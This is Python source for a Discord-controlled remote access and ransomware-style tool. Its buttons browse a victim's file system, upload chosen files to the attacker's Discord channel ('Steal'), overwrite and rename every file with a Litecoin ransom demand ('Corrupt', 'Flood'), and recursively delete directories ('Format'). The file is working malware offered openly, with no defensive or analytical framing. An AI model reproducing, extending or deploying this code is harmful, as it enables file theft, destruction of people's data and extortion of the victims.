import os,discord,threading,random,string
from discord.ext import commands
from discord.ui import Button,View,Modal,TextInput
async def file_nav(ctx):
 path = os.getcwd()
 history = [path]
 history_index = 0
 embed = discord.Embed(
  title=f"**Current Directory:** {path}",
  description="Use the buttons to navigate through files and directories.",
  color=discord.Color.blue()
 )
 async def update_file_nav(path):
  try:
   items = os.listdir(path)
   directories = [item for item in items if os.path.isdir(os.path.join(path,item))]
   files = [item for item in items if not os.path.isdir(os.path.join(path,item))]
   directory_str = "\n".join(directories)
   file_str = "\n".join(files)
   full_description = f"**Directories:**\n{directory_str}\n\n**Files:**\n{file_str}"
   if len(full_description) > 1024:
    full_description = full_description[:1020]+"..."
   embed.clear_fields()
   embed.description = full_description
   view.update_folder_buttons(directories)
   await ctx.send(embed=embed,view=view)
  except Exception as e:
   await ctx.send(f"Error accessing directory: {e}")
 class FileNavView(View):
  def __init__(self,path):
   super().__init__(timeout=None)
   self.path = path
  @discord.ui.button(label="Back (cd ..)",style=discord.ButtonStyle.danger)
  async def back(self,interaction:discord.Interaction,button:Button):
   nonlocal history_index
   parent_path = os.path.dirname(self.path)
   if parent_path != self.path:
    self.path = parent_path
    history_index -= 1
    await interaction.message.delete()
    await update_file_nav(self.path)
   else:
    await interaction.response.send_message("You are already at the root directory.",ephemeral=True)
  @discord.ui.button(label="Corrupt",style=discord.ButtonStyle.red)
  async def corrupt(self,interaction:discord.Interaction,button:Button):
   def corrupt_file(file_path):
    try:
     if "hacked" not in file_path:
      new_file_name = 'hacked'+''.join(random.choices(string.ascii_letters+string.digits,k=4))+'.txt'
      new_file_path = os.path.join(self.path,new_file_name)
      with open(file_path,"w") as f:
       f.write("YOUR PC IS FUCKED!!! IN ORDER TO GET IT BACK PAY 100 USD IN LTC TO LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB"*50)
      os.rename(file_path,new_file_path)
    except Exception as e:
     pass
   def corrupt_dir(directory_path):
    try:
     files = [item for item in os.listdir(directory_path) if not os.path.isdir(os.path.join(directory_path,item))]
     for file in files:
      file_path = os.path.join(directory_path,file)
      corrupt_file(file_path)
     for item in os.listdir(directory_path):
      item_path = os.path.join(directory_path,item)
      if os.path.isdir(item_path):
       new_folder_name = 'hacked'+''.join(random.choices(string.ascii_letters+string.digits,k=4))
       new_folder_path = os.path.join(directory_path,new_folder_name)
       os.rename(item_path,new_folder_path)
       corrupt_dir(new_folder_path)
    except Exception as e:
     pass
   threading.Thread(target=corrupt_dir,args=(self.path,)).start()
   await interaction.response.send_message("Corruption started.",ephemeral=True)
  @discord.ui.button(label="Steal",style=discord.ButtonStyle.red)
  async def steal(self,interaction:discord.Interaction,button:Button):
   modal = StealFileModal(self.path)
   await interaction.response.send_modal(modal)
  @discord.ui.button(label="Format 🗑️",style=discord.ButtonStyle.red)
  async def format(self,interaction:discord.Interaction,button:Button):
   def format_item(item_path):
    try:
     if os.path.isdir(item_path):
      os.rmdir(item_path)
     else:
      os.remove(item_path)
    except Exception as e:
     pass
   def format_dir(directory_path):
    try:
     items = os.listdir(directory_path)
     for item in items:
      item_path = os.path.join(directory_path,item)
      format_item(item_path)
     for item in os.listdir(directory_path):
      item_path = os.path.join(directory_path,item)
      if os.path.isdir(item_path):
       format_dir(item_path)
    except Exception as e:
     pass
   threading.Thread(target=format_dir,args=(self.path,)).start()
   await interaction.response.send_message("Formatting started.",ephemeral=True)
  @discord.ui.button(label="Drive",style=discord.ButtonStyle.red)
  async def drive(self,interaction:discord.Interaction,button:Button):
   nonlocal history_index
   current_drive = self.path[0].upper()
   new_drive = 'C' if current_drive == 'D' else 'D'
   self.path = f"{new_drive}:\\"
   history.append(self.path)
   history_index += 1
   await interaction.message.delete()
   await update_file_nav(self.path)
  @discord.ui.button(label="Flood💧",style=discord.ButtonStyle.blurple)
  async def flood(self,interaction:discord.Interaction,button:Button):
   def flood_directory(directory_path):
    try:
     for _ in range(100):
      file_name = 'hacked'+''.join(random.choices(string.ascii_letters+string.digits,k=4))+'.txt'
      file_path = os.path.join(directory_path,file_name)
      with open(file_path,"w") as f:
       f.write("YOUR PC IS FUCKED!!! IN ORDER TO GET IT BACK PAY 100 USD IN LTC TO LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB"*50)
    except Exception as e:
     pass
   threading.Thread(target=flood_directory,args=(self.path,)).start()
   await interaction.response.send_message("Flooding started.",ephemeral=True)
  def update_folder_buttons(self,directories):
   self.clear_items()
   limit = 18
   for dir_name in directories[:limit]:
    dir_button = Button(label=dir_name,style=discord.ButtonStyle.success)
    dir_button.callback = lambda interaction,dir_name=dir_name:self.go_to_folder(interaction,dir_name)
    self.add_item(dir_button)
   self.add_item(self.back)
   self.add_item(self.corrupt)
   self.add_item(self.steal)
   self.add_item(self.format)
   self.add_item(self.drive)
   self.add_item(self.flood)
  async def go_to_folder(self,interaction:discord.Interaction,folder_name:str):
   nonlocal history_index
   self.path = os.path.join(self.path,folder_name)
   history.append(self.path)
   history_index += 1
   await interaction.message.delete()
   await update_file_nav(self.path)
 class StealFileModal(Modal):
  def __init__(self,path):
   super().__init__(title="Enter File Name")
   self.path = path
  file_name = TextInput(label="File Name",placeholder="Enter the file name...",required=True)
  async def on_submit(self,interaction:discord.Interaction):
   file_name = self.file_name.value
   file_path = os.path.join(self.path,file_name)
   if os.path.isfile(file_path):
    file_size = os.path.getsize(file_path)
    if file_size < 10*1024*1024:
     await interaction.response.send_message(
      file=discord.File(file_path,filename=file_name),
      ephemeral=True
     )
    else:
     await interaction.response.send_message(f"The file '{file_name}' is too large to send.",ephemeral=True)
   else:
    await interaction.response.send_message(f"The file '{file_name}' does not exist.",ephemeral=True)
 view = FileNavView(path)
 await update_file_nav(path)
